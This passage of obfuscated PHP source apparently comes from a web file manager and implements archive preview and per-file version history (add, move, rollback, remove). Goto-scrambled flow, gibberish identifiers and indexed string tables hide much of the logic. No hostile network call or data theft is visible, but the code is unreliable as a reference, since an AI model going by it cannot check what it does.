$EÚˆ·ÔèÛ¡); $f—Œ²öÏéí = $fÄÃ¬²·ğ ? $fÄÃ¬²·ğ : self::download($C‘ó®Ú©‡, $f—Œ²öÏéí); } } goto CŞ‹Ì¾£Ç; c‘¹ÚèËò: $c¤»ñçÈšÇ = json_encode($D‰ğ‡ô›‘¢[$DÙÎËîØ„[1109]]); self::setContent($A”Á¬²” , $c¤»ñçÈšÇ); if (count($D‰ğ‡ô›‘¢[$DÙÎËîØ„[1109]]) >= $fÓğšÓî‘º) { show_json(sprintf(LNG($DÙÎËîØ„[1113]), count($D‰ğ‡ô›‘¢[$DÙÎËîØ„[1109]])), !1); } goto C‹¹ç“‰¹“; cñ©ê…¬£: if (isset($Eª”Å†·„‚)) { $cÆÍ³ ¢÷‡ = array($Eª”Å†·„‚[$DÙÎËîØ„[76]], $Eª”Å†·„‚[$DÙÎËîØ„[1111]], $Eª”Å†·„‚[$DÙÎËîØ„[28]]); $fß´å½É‡Ú = md5(implode($DÙÎËîØ„[71], $cÆÍ³ ¢÷‡)) . $DÙÎËîØ„[95] . get_path_ext($Eª”Å†·„‚[$DÙÎËîØ„[28]]); } else { $cÆÍ³ ¢÷‡ = array($Eï¿Ÿºç»©[$DÙÎËîØ„[28]], $Eï¿Ÿºç»©[$DÙÎËîØ„[76]], $Eï¿Ÿºç»©[$DÙÎËîØ„[78]]); $fß´å½É‡Ú = md5(implode($DÙÎËîØ„[71], $cÆÍ³ ¢÷‡)) . $DÙÎËîØ„[95] . $EÚˆ·ÔèÛ¡; } if ($c…äÏŒö„ == -1) { $A”Á¬²”  = IO_PATH_SYSTEM_TEMP . "\172\x69\160\126\x69\145\x77\57{$EâÑ‘ç‹²‘}\57{$fß´å½É‡Ú}\x2e\x6c\157\147"; $aï–°ïë‰œ = self::infoFull($A”Á¬²” ); if ($aï–°ïë‰œ) { $A”Á¬²”  = $aï–°ïë‰œ[$DÙÎËîØ„[76]]; $BÔ¨­“Ö = self::getContent($A”Á¬²” ); if ($BÔ¨­“Ö) { $c¤»ñçÈšÇ = json_decode($BÔ¨­“Ö, !0); if (count($c¤»ñçÈšÇ) >= $fÓğšÓî‘º) { show_json(sprintf(LNG($DÙÎËîØ„[1113]), count($c¤»ñçÈšÇ)), !1); } return $c¤»ñçÈšÇ; } } else { $A”Á¬²”  = self::mkfile($A”Á¬²” ); } } $fƒ¿‚ò—Á = TEMP_FILES . $EâÑ‘ç‹²‘; goto A¨ÇŸº“; CŞ‹Ì¾£Ç: $f—Œ²öÏéí = self::iconvSystem($f—Œ²öÏéí); if ($c…äÏŒö„ >= 0) { $AìÁØ®Ü« = isset($FõÔöĞì‡ƒ[$DÙÎËîØ„[1115]]) ? $FõÔöĞì‡ƒ[$DÙÎËîØ„[1115]] : !1; $dĞÁ‘ãòùï = isset($FõÔöĞì‡ƒ[$DÙÎËîØ„[28]]) ? $FõÔöĞì‡ƒ[$DÙÎËîØ„[28]] : $DÙÎËîØ„[33]; KodArchive::filePreview($f—Œ²öÏéí, $c…äÏŒö„, $AìÁØ®Ü«, $dĞÁ‘ãòùï); self::archiveExt(); die; } $D‰ğ‡ô›‘¢ = KodArchive::listContent($f—Œ²öÏéí); goto A¹×´ê´¬Â; C‹¹ç“‰¹“: return $D‰ğ‡ô›‘¢[$DÙÎËîØ„[1109]]; goto EÔôÒ÷œí; A¹×´ê´¬Â: self::archiveExt(); del_dir($fƒ¿‚ò—Á); if (!$D‰ğ‡ô›‘¢[$DÙÎËîØ„[1107]]) { show_json($D‰ğ‡ô›‘¢[$DÙÎËîØ„[1109]], !1); } goto c‘¹ÚèËò; Aà¦­ˆ¸Ñ: $fÓğšÓî‘º = 50000; if (request_url_safe($C‘ó®Ú©‡)) { $Eª”Å†·„‚ = parse_url_query($C‘ó®Ú©‡); if (!isset($Eª”Å†·„‚[$DÙÎËîØ„[76]])) { show_json($DÙÎËîØ„[1112], !1); } } $EˆÀ×¼Œæ = isset($Eª”Å†·„‚) ? $Eª”Å†·„‚[$DÙÎËîØ„[76]] : $C‘ó®Ú©‡; goto b‚’§¸İêÙ; EÔôÒ÷œí: } private static function fileExt($BÔ÷ÁîÙÇ·) { $dµ®ä›¼ôƒ =& $_SERVER[ä°„ä°º]; $dŠÖ¢ïµÆô = $BÔ÷ÁîÙÇ·[$dµ®ä›¼ôƒ[168]]; if ($dŠÖ¢ïµÆô == $dµ®ä›¼ôƒ[1116]) { $EŠàæŸ°¤× = $dµ®ä›¼ôƒ[1117]; if (substr($BÔ÷ÁîÙÇ·[$dµ®ä›¼ôƒ[28]], -strlen($EŠàæŸ°¤×)) == $EŠàæŸ°¤×) { $dŠÖ¢ïµÆô = $dµ®ä›¼ôƒ[1118]; } } self::archiveExt($dŠÖ¢ïµÆô); return $dŠÖ¢ïµÆô; } private static function zipFileList($ağ“ÈÂÖ­, $fÓà’¯“ = false) { $eÈÏßÏÀª =& $_SERVER[ä°„ä°º]; $f›ˆè·±‹ = array(); foreach ($ağ“ÈÂÖ­ as $fèËµê¾¢ ) { $d‡¡ñ–ñŞœ = $fèËµê¾¢ [$eÈÏßÏÀª[76]]; if ($fÓà’¯“) { $d‡¡ñ–ñŞœ = self::copy($fèËµê¾¢ [$eÈÏßÏÀª[76]], $fÓà’¯“, $eÈÏßÏÀª[806]); } else { $FÚºÆˆ°îï = self::init($fèËµê¾¢ [$eÈÏßÏÀª[76]]); if ($FÚºÆˆ°îï->getType() == $eÈÏßÏÀª[106]) { $d‡¡ñ–ñŞœ = $FÚºÆˆ°îï->path; } } if ($d‡¡ñ–ñŞœ && self::local()->exist($d‡¡ñ–ñŞœ)) { $f›ˆè·±‹[$fèËµê¾¢ [$eÈÏßÏÀª[76]]] = $d‡¡ñ–ñŞœ; } } if (!empty($f›ˆè·±‹)) { return array_values($f›ˆè·±‹); } show_json(LNG($eÈÏßÏÀª[1082]), !1); } public static function tmpFileName($A•µ¼¿Ü™ª) { $cô˜ÀÚ…á÷ =& $_SERVER[ä°„ä°º]; $FĞ“Ğ—ìÂ = array($A•µ¼¿Ü™ª[$cô˜ÀÚ…á÷[28]], $A•µ¼¿Ü™ª[$cô˜ÀÚ…á÷[76]], $A•µ¼¿Ü™ª[$cô˜ÀÚ…á÷[78]], $A•µ¼¿Ü™ª[$cô˜ÀÚ…á÷[502]]); return md5(implode($cô˜ÀÚ…á÷[71], $FĞ“Ğ—ìÂ)); } private static function localFilePath($dğàºòÏÕ¬, $B¢À©÷ˆ…) { goto A¥Ó†ª°‘; CÙÂ²ìĞÓİ: if ($B‚Äˆ·ªÓì == $b¤ÀËã££Û[106] || $B‚Äˆ·ªÓì == $b¤ÀËã££Û[1122]) { if (!$Fµœ‚Ï³Ûß->exist($Fµœ‚Ï³Ûß->path)) { show_json(LNG($b¤ÀËã££Û[105]), !1); } return $Fµœ‚Ï³Ûß->path; } return !1; goto cí˜¼Ü‘âã; e‹„ ¤ç‰•: if ($D»Óà˜ö[$b¤ÀËã££Û[29]] == KodIO::KOD_SOURCE) { $F×òåª¤¼İ = Model($b¤ÀËã££Û[813])->fileInfoGet(KodIO::sourceID($dğàºòÏÕ¬)); if (!$F×òåª¤¼İ[$b¤ÀËã££Û[76]]) { show_json($b¤ÀËã££Û[1121], !1); } $dğàºòÏÕ¬ = $F×òåª¤¼İ[$b¤ÀËã££Û[76]]; } $Fµœ‚Ï³Ûß = self::init($dğàºòÏÕ¬); $B‚Äˆ·ªÓì = $Fµœ‚Ï³Ûß->getType(); goto CÙÂ²ìĞÓİ; A¥Ó†ª°‘: $b¤ÀËã££Û =& $_SERVER[ä°„ä°º]; if ($B¢À©÷ˆ… == $b¤ÀËã££Û[1119] && strtoupper(substr(PHP_OS, 0, 3)) == $b¤ÀËã££Û[1120]) { return !1; } $D»Óà˜ö = KodIO::parse($dğàºòÏÕ¬); goto e‹„ ¤ç‰•; cí˜¼Ü‘âã: } private static function archiveExt($cÄ„ÁßÄõ³ = '') { $GLOBALS[$_SERVER[ä°„ä°º][1123]] = $cÄ„ÁßÄõ³; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto càò¬„ÖÚË; càò¬„ÖÚË: $d¯äÈÕò“¼ =& $_SERVER[ä°„ä°º]; $FÒöîˆ‡îâ = $GLOBALS[$d¯äÈÕò“¼[6]][$d¯äÈÕò“¼[88]]; if ($FÒöîˆ‡îâ[$d¯äÈÕò“¼[1124]] != 1) { return; } goto eÉÜ‚ÖôÀ; b£¡ÎÃßŒá: Hook::bind($d¯äÈÕò“¼[1129], $d¯äÈÕò“¼[1130]); Hook::bind($d¯äÈÕò“¼[1131], $d¯äÈÕò“¼[1132]); Hook::bind($d¯äÈÕò“¼[1133], $d¯äÈÕò“¼[1134]); goto b†§•—Ùª¾; eÉÜ‚ÖôÀ: if ($FÒöîˆ‡îâ[$d¯äÈÕò“¼[1125]] <= 0) { return; } if (isset($_REQUEST[$d¯äÈÕò“¼[1126]]) && $_REQUEST[$d¯äÈÕò“¼[1126]] == $d¯äÈÕò“¼[87]) { return; } Hook::bind($d¯äÈÕò“¼[1127], $d¯äÈÕò“¼[1128]); goto b£¡ÎÃßŒá; b†§•—Ùª¾: Hook::bind($d¯äÈÕò“¼[1135], $d¯äÈÕò“¼[1136]); Hook::bind($d¯äÈÕò“¼[1137], $d¯äÈÕò“¼[1138]); goto bÕª±Ï­†; bÕª±Ï­†: } public static function eventBeforeUpload($Cêİ÷™ÙÓŒ) { if ($Cêİ÷™ÙÓŒ[3] && $Cêİ÷™ÙÓŒ[3] != REPEAT_REPLACE) { return; } $bÉçÖ¯ğ† = self::parsePath($Cêİ÷™ÙÓŒ[0]); if (!$bÉçÖ¯ğ†) { return; } self::add($bÉçÖ¯ğ†); } public static function eventBeforeEdit($Eİ³Èöù‘¥) { $E‚Š·ØÍ  = self::parsePath($Eİ³Èöù‘¥[0]); if (!$E‚Š·ØÍ ) { return; } self::add($E‚Š·ØÍ ); } public static function eventBeforeCopyFile($d³Øèò‚È§, $b”Ò·ê†©Š, $b¦Ì‰µªÎÈ, $E—Ë÷É‹™”, $a•‹Å‹áÉÑ, $B‘¥ò†ÉŠß) { $a®àÖÊ»Î = $b¦Ì‰µªÎÈ->getPathOuter($E—Ë÷É‹™”); $a•´Ü¯İˆÙ = self::parsePath($a®àÖÊ»Î); if (!$a•´Ü¯İˆÙ) { return; } self::add($a•´Ü¯İˆÙ); } public static function eventBeforeRename($b¬Ğ““ì³³) { $a¾ä‹Äšùë =& $_SERVER[ä°„ä°º]; $eÍ¸ÑÜÕ²í = self::parsePath($b¬Ğ““ì³³[0]); if (!$eÍ¸ÑÜÕ²í) { return; } $F¦ßˆ¿ƒÆÓ = self::checkInHistory($eÍ¸ÑÜÕ²í); if (!$F¦ßˆ¿ƒÆÓ) { return; } if ($F¦ßˆ¿ƒÆÓ[$a¾ä‹Äšùë[29]] == $a¾ä‹Äšùë[193]) { $dˆùíóÍğğ = self::listData($eÍ¸ÑÜÕ²í); if ($dˆùíóÍğğ && $dˆùíóÍğğ[$a¾ä‹Äšùë[367]]) { self::moveHistory($eÍ¸ÑÜÕ²í, $b¬Ğ““ì³³[1]); } } else { IO::rename($F¦ßˆ¿ƒÆÓ[$a¾ä‹Äšùë[76]], $b¬Ğ““ì³³[1]); } } public static function eventBeforeMove($f¥à…‘µØÜ) { goto CêÂ”‡ŠÉ‰; c„…¢À¸Ş§: $D“Ô®¾áò˜ = self::checkInHistory($c§ÚìÃÚ§î); if (!$D“Ô®¾áò˜) { return; } $F‡¢ÆöĞ‚ = self::pathHistory($c±¼ˆô´™à); goto cà Œ„ˆÅ; cà Œ„ˆÅ: if ($D“Ô®¾áò˜[$C¦ä™½Ğ·[29]] == $C¦ä™½Ğ·[193]) { $B‡£ŞÏ•„‘ = self::listData($c§ÚìÃÚ§î); $bŠÁ¢ƒ¼± = rtrim($c±¼ˆô´™à, $C¦ä™½Ğ·[8]) . $C¦ä™½Ğ·[8] . ($F‰İ˜¼éñ† ? $F‰İ˜¼éñ† : get_path_this($c§ÚìÃÚ§î)); $eµÊ‘âÜõ = self::listData($bŠÁ¢ƒ¼±); if ($B‡£ŞÏ•„‘ && $B‡£ŞÏ•„‘[$C¦ä™½Ğ·[367]] && $eµÊ‘âÜõ && $eµÊ‘âÜõ[$C¦ä™½Ğ·[367]]) { return self::clear($c§ÚìÃÚ§î); } if ($B‡£ŞÏ•„‘ && $B‡£ŞÏ•„‘[$C¦ä™½Ğ·[367]]) { self::moveHistory($c§ÚìÃÚ§î, $F‰İ˜¼éñ†, $F‡¢ÆöĞ‚); } } else { IO::move($D“Ô®¾áò˜[$C¦ä™½Ğ·[76]], $F‡¢ÆöĞ‚, !1, $F‰İ˜¼éñ†); self::clearEmptyFolder(IO::pathFather($D“Ô®¾áò˜[$C¦ä™½Ğ·[76]])); } goto a õª“©Â…; ağ¢ò¡§: $c±¼ˆô´™à = self::parsePath($f¥à…‘µØÜ[1]); if (!$c±¼ˆô´™à) { return; } $F‰İ˜¼éñ† = $f¥à…‘µØÜ[3]; goto c„…¢À¸Ş§; CêÂ”‡ŠÉ‰: $C¦ä™½Ğ· =& $_SERVER[ä°„ä°º]; $c§ÚìÃÚ§î = self::parsePath($f¥à…‘µØÜ[0]); if (!$c§ÚìÃÚ§î) { return; } goto ağ¢ò¡§; a õª“©Â…: } public static function eventAfterRemove($B‡×–¨äœ©, $f‚“¬ôáöÉ) { goto e©·ÃÄä; bÇÓ²Âó’: if ($DŒø²‹ï¨Æ[$D¶ƒŠ‰Ôî[29]] == $D¶ƒŠ‰Ôî[193]) { $b†ñŒ®© = self::listData($Böå¶¢ÚÁ‰, !1); if ($b†ñŒ®© && $b†ñŒ®©[$D¶ƒŠ‰Ôî[367]]) { self::clear($Böå¶¢ÚÁ‰, !1); } } else { IO::remove($DŒø²‹ï¨Æ[$D¶ƒŠ‰Ôî[76]]); self::clearEmptyFolder(IO::pathFather($DŒø²‹ï¨Æ[$D¶ƒŠ‰Ôî[76]])); } goto F¶œñùçç; e©·ÃÄä: $D¶ƒŠ‰Ôî =& $_SERVER[ä°„ä°º]; if (!$f‚“¬ôáöÉ) { return; } $Böå¶¢ÚÁ‰ = self::parsePath($B‡×–¨äœ©[0]); goto B¦…â†À; B¦…â†À: if (!$Böå¶¢ÚÁ‰) { return; } $DŒø²‹ï¨Æ = self::checkInHistory($Böå¶¢ÚÁ‰); if (!$DŒø²‹ï¨Æ) { return; } goto bÇÓ²Âó’; F¶œñùçç: } private static function checkInHistory($dõ¿ğ²ÚÃ¸) { $aÎÙø‚±µ = self::pathHistory($dõ¿ğ²ÚÃ¸); if (!IO::exist($aÎÙø‚±µ)) { $aÎÙø‚±µ .= $_SERVER[ä°„ä°º][1139]; } return IO::exist($aÎÙø‚±µ) ? IO::info($aÎÙø‚±µ) : !1; } private static function parsePath($CÙ¤Æ­îø›) { goto bƒ‚‡íŒë”; f£ñÀÏ§ª: $fÈÈ½˜‚Ú„ = KodIO::parse($CÙ¤Æ­îø›); $d™·Ó¿Ë‰Å = $fÈÈ½˜‚Ú„[$Dæ¹Æçç‘ó[29]]; $Fƒ›œš·ë = !$d™·Ó¿Ë‰Å || $d™·Ó¿Ë‰Å == KodIO::KOD_IO || $d™·Ó¿Ë‰Å == KodIO::KOD_SHARE_ITEM; goto Bôï¬ğ³; bƒ‚‡íŒë”: $Dæ¹Æçç‘ó =& $_SERVER[ä°„ä°º]; if (!$CÙ¤Æ­îø›) { return !1; } if ($GLOBALS[$Dæ¹Æçç‘ó[1140]]) { return; } goto f£ñÀÏ§ª; F”ÆÆé©“: if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $CÀ¨Ì×ã¯ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $Dæ¹Æçç‘ó[1143]); foreach ($CÀ¨Ì×ã¯ as $bä—Ÿ‘œÌì) { if (!$d™·Ó¿Ë‰Å && substr($CÙ¤Æ­îø›, 0, strlen($bä—Ÿ‘œÌì)) == $bä—Ÿ‘œÌì) { return !1; } } goto D¸é»ƒÀ§; Bôï¬ğ³: if (!$Fƒ›œš·ë || !$fÈÈ½˜‚Ú„[$Dæ¹Æçç‘ó[1141]]) { return !1; } if (substr($CÙ¤Æ­îø›, 0, strlen(DATA_PATH . $Dæ¹Æçç‘ó[1142])) == DATA_PATH . $Dæ¹Æçç‘ó[1142]) { return !1; } if ($d™·Ó¿Ë‰Å == KodIO::KOD_SHARE_ITEM) { $fèô³ÛÑ… = IO::init($CÙ¤Æ­îø›); if ($fèô³ÛÑ…->pathParse[$Dæ¹Æçç‘ó[1069]]) { return self::parsePath($fèô³ÛÑ…->pathParse[$Dæ¹Æçç‘ó[1069]]); } return !1; } goto F”ÆÆé©“; D¸é»ƒÀ§: self::log($GLOBALS[$Dæ¹Æçç‘ó[1064]] . $Dæ¹Æçç‘ó[1144] . $CÙ¤Æ­îø›); return $CÙ¤Æ­îø›; goto c…’ø«­ºõ; c…’ø«­ºõ: } private static function pathHistory($cˆôéã‡½ö) { $eî÷×¢„Ø =& $_SERVER[ä°„ä°º]; $AÕ”¾™ŒîÌ = self::$_historyBase . ltrim(KodIO::clear($cˆôéã‡½ö), $eî÷×¢„Ø[8]); $AÕ”¾™ŒîÌ = str_replace(array($eî÷×¢„Ø[1145]), array($eî÷×¢„Ø[1146]), $AÕ”¾™ŒîÌ); return $AÕ”¾™ŒîÌ; } public static function log($dÑæ¢Šê§ì) { } public static function historyCount($FŒöæÆŒ…Í) { $eîŸ•íÎƒİ =& $_SERVER[ä°„ä°º]; $Cõ„‚»õÖè = array(); $d°„‘èç½¸ = array(); foreach ($FŒöæÆŒ…Í as $F”Á©í¶ëÃ) { $C«Õ…ÕÙ³ß = get_path_father($F”Á©í¶ëÃ); if (!$d°„‘èç½¸[$C«Õ…ÕÙ³ß]) { $d°„‘èç½¸[$C«Õ…ÕÙ³ß] = array(); } $d°„‘èç½¸[$C«Õ…ÕÙ³ß][] = get_path_this($F”Á©í¶ëÃ); } foreach ($d°„‘èç½¸ as $C«Õ…ÕÙ³ß => $b‚Œ ˆ‹„Æ) { $Cæ–ŠËª©È = self::parsePath($C«Õ…ÕÙ³ß); if (!$Cæ–ŠËª©È) { continue; } foreach ($b‚Œ ˆ‹„Æ as $C§ç‚½©Â‘) { $aÃ™„Â¼Ê = self::listData(rtrim($Cæ–ŠËª©È, $eîŸ•íÎƒİ[8]) . $eîŸ•íÎƒİ[8] . $C§ç‚½©Â‘, !1); if ($aÃ™„Â¼Ê && $aÃ™„Â¼Ê[$eîŸ•íÎƒİ[367]]) { $Cõ„‚»õÖè[rtrim($C«Õ…ÕÙ³ß, $eîŸ•íÎƒİ[8]) . $eîŸ•íÎƒİ[8] . $C§ç‚½©Â‘] = count($aÃ™„Â¼Ê[$eîŸ•íÎƒİ[367]]); } } } return $Cõ„‚»õÖè; } public static function add($A‰¦®ö—‰‚) { goto aº˜²·ª®î; e¯® Ù±‘: if ($e‹Ş·ÈÀî <= 0) { return; } $E§Œ—Ôö‡§ = IO::hashSimple($A‰¦®ö—‰‚); $AËˆ ÑõÉ = IO::info($A‰¦®ö—‰‚); goto Bâ›ŞÛ›½„; b‡ÈæÌàëğ: if ($BÓ˜ÌÕìšô && $BÓ˜ÌÕìšô[0][$AÇò¾«œ¤[171]] == $E§Œ—Ôö‡§) { return !0; } if (array_key_exists($AÇò¾«œ¤[196], $AËˆ ÑõÉ) && !$AËˆ ÑõÉ[$AÇò¾«œ¤[196]]) { return !1; } $D›Ñˆˆé£† = short_id(time()); goto bµµèïÅ…; Bâ›ŞÛ›½„: $BÓ˜ÌÕìšô = $DêÚ½ ïùÛ[$AÇò¾«œ¤[367]]; if ($AËˆ ÑõÉ[$AÇò¾«œ¤[78]] == 0) { return; } if ($AËˆ ÑõÉ[$AÇò¾«œ¤[78]] >= 1024 * 1024 * 500) { return !1; } goto b‡ÈæÌàëğ; AÍœ½¤µ™‘: $fÛ­›ç¨´ = Model($AÇò¾«œ¤[753])->get($AÇò¾«œ¤[1147]); $e‹Ş·ÈÀî = $GLOBALS[$AÇò¾«œ¤[6]][$AÇò¾«œ¤[88]][$AÇò¾«œ¤[1125]]; $f‘—ãÈ’â = $fÛ­›ç¨´ == $AÇò¾«œ¤[1148] ? 5 : $e‹Ş·ÈÀî; goto e¯® Ù±‘; aº˜²·ª®î: $AÇò¾«œ¤ =& $_SERVER[ä°„ä°º]; $DêÚ½ ïùÛ = self::listData($A‰¦®ö—‰‚); if (!$DêÚ½ ïùÛ) { return; } goto AÍœ½¤µ™‘; Eƒ’ˆ¨·õŒ: return self::saveData($DêÚ½ ïùÛ[$AÇò¾«œ¤[1152]], $BÓ˜ÌÕìšô); goto dà§ˆĞ†¼Ë; DŒÎâŒ‘™Ó: if (!$dêÁœù¼”) { self::clearEmptyFolder($DêÚ½ ïùÛ[$AÇò¾«œ¤[1151]]); return !1; } array_unshift($BÓ˜ÌÕìšô, $Bê§¾®âóÖ); if (count($BÓ˜ÌÕìšô) > $f‘—ãÈ’â) { $cÁ‰šÅæ = array_slice($BÓ˜ÌÕìšô, $f‘—ãÈ’â); foreach ($cÁ‰šÅæ as $aŞ‚¯²÷Œ‚) { IO::remove($DêÚ½ ïùÛ[$AÇò¾«œ¤[1151]] . $aŞ‚¯²÷Œ‚[$AÇò¾«œ¤[28]]); } $BÓ˜ÌÕìšô = array_slice($BÓ˜ÌÕìšô, 0, $f‘—ãÈ’â); } goto Eƒ’ˆ¨·õŒ; bµµèïÅ…: $Bê§¾®âóÖ = array($AÇò¾«œ¤[393] => $D›Ñˆˆé£†, $AÇò¾«œ¤[171] => $E§Œ—Ôö‡§, $AÇò¾«œ¤[28] => $AËˆ ÑõÉ[$AÇò¾«œ¤[28]] . $AÇò¾«œ¤[95] . date($AÇò¾«œ¤[1149]) . rand_string(1), $AÇò¾«œ¤[78] => $AËˆ ÑõÉ[$AÇò¾«œ¤[78]], $AÇò¾«œ¤[432] => USER_ID, $AÇò¾«œ¤[194] => time(), $AÇò¾«œ¤[1150] => $AÇò¾«œ¤[33]); IO::mkdir($DêÚ½ ïùÛ[$AÇò¾«œ¤[1151]]); $dêÁœù¼” = IO::copy($A‰¦®ö—‰‚, $DêÚ½ ïùÛ[$AÇò¾«œ¤[1151]], !1, $Bê§¾®âóÖ[$AÇò¾«œ¤[28]]); goto DŒÎâŒ‘™Ó; dà§ˆĞ†¼Ë: } public static function remove($dÊ¸öãŠ›, $e«¸ÀÂ¢ö˜) { $CÏˆ®¯Œ¡ä =& $_SERVER[ä°„ä°º]; $aÊ»×¼£… = self::listData($dÊ¸öãŠ›); $BªÒåòñğ‚ = array(); if (!$aÊ»×¼£…) { return !1; } foreach ($aÊ»×¼£…[$CÏˆ®¯Œ¡ä[367]] as $CÀŠµì¦×‡) { if ($CÀŠµì¦×‡[$CÏˆ®¯Œ¡ä[393]] == $e«¸ÀÂ¢ö˜) { IO::remove($aÊ»×¼£…[$CÏˆ®¯Œ¡ä[1151]] . $CÀŠµì¦×‡[$CÏˆ®¯Œ¡ä[28]]); continue; } $BªÒåòñğ‚[] = $CÀŠµì¦×‡; } return self::saveData($aÊ»×¼£…[$CÏˆ®¯Œ¡ä[1152]], $BªÒåòñğ‚); } public static function clear($BØ¤ÒÒ Â’, $Fëèº¿öÂ = true) { $DÕ™È¶…Ö =& $_SERVER[ä°„ä°º]; $B÷š‘ÀÒÁ¿ = self::listData($BØ¤ÒÒ Â’, $Fëèº¿öÂ); if (!$B÷š‘ÀÒÁ¿) { return !1; } foreach ($B÷š‘ÀÒÁ¿[$DÕ™È¶…Ö[367]] as $EÔìã†¤•Œ) { IO::remove($B÷š‘ÀÒÁ¿[$DÕ™È¶…Ö[1151]] . $EÔìã†¤•Œ[$DÕ™È¶…Ö[28]]); } return self::saveData($B÷š‘ÀÒÁ¿[$DÕ™È¶…Ö[1152]], array()); } public static function moveHistory($CæÄ¬ò©“Œ, $c¤¨‚ĞÍ‹Ë = '', $BŸŒ”—å‚© = '') { goto Bµ˜§ààß; CŒã¬½È‹: $fÉ¥Ğø´ = substr(get_path_this($C˜–Ü«ñ¼‘[$fôæÃ”ìÂâ[1152]]), 0, -strlen($B¤¹§³Êµ‘)); foreach ($C˜–Ü«ñ¼‘[$fôæÃ”ìÂâ[367]] as $e ïç³²İÆ => $E…ÌÀñàè) { $dôé¯Æ¸Ü‡ = $c¤¨‚ĞÍ‹Ë . substr($E…ÌÀñàè[$fôæÃ”ìÂâ[28]], strlen($fÉ¥Ğø´)); $aÒæÕˆ‚ñÄ = IO::move($C˜–Ü«ñ¼‘[$fôæÃ”ìÂâ[1151]] . $E…ÌÀñàè[$fôæÃ”ìÂâ[28]], $BŸŒ”—å‚©, !1, $dôé¯Æ¸Ü‡); if ($aÒæÕˆ‚ñÄ) { $C˜–Ü«ñ¼‘[$fôæÃ”ìÂâ[367]][$e ïç³²İÆ][$fôæÃ”ìÂâ[28]] = $dôé¯Æ¸Ü‡; } } $C˜–Ü«ñ¼‘[$fôæÃ”ìÂâ[1152]] = IO::move($C˜–Ü«ñ¼‘[$fôæÃ”ìÂâ[1152]], $BŸŒ”—å‚©, !1, $c¤¨‚ĞÍ‹Ë . $B¤¹§³Êµ‘); goto a¹°ÍÃ¼ÅŒ; a¹°ÍÃ¼ÅŒ: self::saveData($C˜–Ü«ñ¼‘[$fôæÃ”ìÂâ[1152]], $C˜–Ü«ñ¼‘[$fôæÃ”ìÂâ[367]]); self::clearEmptyFolder($C˜–Ü«ñ¼‘[$fôæÃ”ìÂâ[1151]]); goto a¹º¦ÏÛ™Ç; eËÍ”ï»öˆ: $B¤¹§³Êµ‘ = $fôæÃ”ìÂâ[1139]; $c¤¨‚ĞÍ‹Ë = $c¤¨‚ĞÍ‹Ë ? $c¤¨‚ĞÍ‹Ë : get_path_this($CæÄ¬ò©“Œ); $BŸŒ”—å‚© = $BŸŒ”—å‚© ? $BŸŒ”—å‚© : $C˜–Ü«ñ¼‘[$fôæÃ”ìÂâ[1151]]; goto CŒã¬½È‹; Bµ˜§ààß: $fôæÃ”ìÂâ =& $_SERVER[ä°„ä°º]; $C˜–Ü«ñ¼‘ = self::listData($CæÄ¬ò©“Œ, !1); if (!$C˜–Ü«ñ¼‘ || !$C˜–Ü«ñ¼‘[$fôæÃ”ìÂâ[367]]) { return !1; } goto eËÍ”ï»öˆ; a¹º¦ÏÛ™Ç: } public static function rollback($F‘µÇåØàñ, $f‹ÑƒëÁêÃ) { $eÖì×•Ú™ =& $_SERVER[ä°„ä°º]; $CÆêØó¢ˆ° = self::listData($F‘µÇåØàñ); if (!$CÆêØó¢ˆ°) { return; } $DŠ››ğÇÊ• = IO::info($F‘µÇåØàñ); foreach ($CÆêØó¢ˆ°[$eÖì×•Ú™[367]] as $AŠ†ÌÒ•¯ => $b‡ˆ×÷öÌ…) { if ($b‡ˆ×÷öÌ…[$eÖì×•Ú™[393]] == $f‹ÑƒëÁêÃ) { self::add($F‘µÇåØàñ); $Aé“—ğ±†— = $CÆêØó¢ˆ°[$eÖì×•Ú™[1151]] . $b‡ˆ×÷öÌ…[$eÖì×•Ú™[28]]; $E‡Í¢–çŠ˜ = IO::copy($Aé“—ğ±†—, IO::pathFather($F‘µÇåØàñ), REPEAT_REPLACE, $DŠ››ğÇÊ•[$eÖì×•Ú™[28]]); if ($E‡Í¢–çŠ˜) { self::remove($F‘µÇåØàñ, $f‹ÑƒëÁêÃ); } return $E‡Í¢–çŠ˜; } } return !1; } public static function setDetail($D®‘œÚŒ†, $e¿¦·—Ì§, $E÷êˆ˜¿) { $fñáİØØØ± =& $_SERVER[ä°„ä°º]; $fë·ê‹÷ùİ = self::listData($D®‘œÚŒ†); if (!$fë·ê‹÷ùİ) { return; } foreach ($fë·ê‹÷ùİ[$fñáİØØØ±[367]] as $c«¨Éæ‚‘ => $Bä‘˜ê­¹) { if ($Bä‘˜ê­¹[$fñáİØØØ±[393]] == $e¿¦·—Ì§) { $fë·ê‹÷ùİ[$fñáİØØØ±[367]][$c«¨Éæ‚‘][$fñáİØØØ±[1150]] = $E÷êˆ˜¿; self::saveData($fë·ê‹÷ùİ[$fñáİØØØ±[1152]], $fë·ê‹÷ùİ[$fñáİØØØ±[367]]); return !0; } } return !1; } public static function fileInfo($b§‡ëøÊÀŸ, $eóŞ¤“ñ˜®) { goto Cùí§Ö¬; Cæ±†âÏ¢: return IO::info($F°«¿Ã¡‚); goto bÉ’ÎÈÉ£; B‰ëù¤Ğš‚: $F°«¿Ã¡‚ = $F³¾„Ú‡ÍÍ[33]; foreach ($fÁ¤Ü¾¢ù[$F³¾„Ú‡ÍÍ[367]] as $CÙµ§Â¯Ï => $cËÂÑ­ßÆà) { if ($cËÂÑ­ßÆà[$F³¾„Ú‡ÍÍ[393]] != $eóŞ¤“ñ˜®) { continue; } $F°«¿Ã¡‚ = $fÁ¤Ü¾¢ù[$F³¾„Ú‡ÍÍ[1151]] . $cËÂÑ­ßÆà[$F³¾„Ú‡ÍÍ[28]]; break; } if (!$F°«¿Ã¡‚) { show_json(LNG($F³¾„Ú‡ÍÍ[105]), !1); } goto Cæ±†âÏ¢; Cùí§Ö¬: $F³¾„Ú‡ÍÍ =& $_SERVER[ä°„ä°º]; $fÁ¤Ü¾¢ù = self::listData($b§‡ëøÊÀŸ); if (!$fÁ¤Ü¾¢ù) { show_json(LNG($F³¾„Ú‡ÍÍ[105]), !1); } goto B‰ëù¤Ğš‚; bÉ’ÎÈÉ£: } public static function fileOut($CÀÛ‰öí×‰, $A¶¡¶÷¨, $dáåğÊÖòí = false) { $E‡¯ÉĞ³‹ =& $_SERVER[ä°„ä°º]; $A‚¨îó†Õ = self::fileInfo($CÀÛ‰öí×‰, $A¶¡¶÷¨); 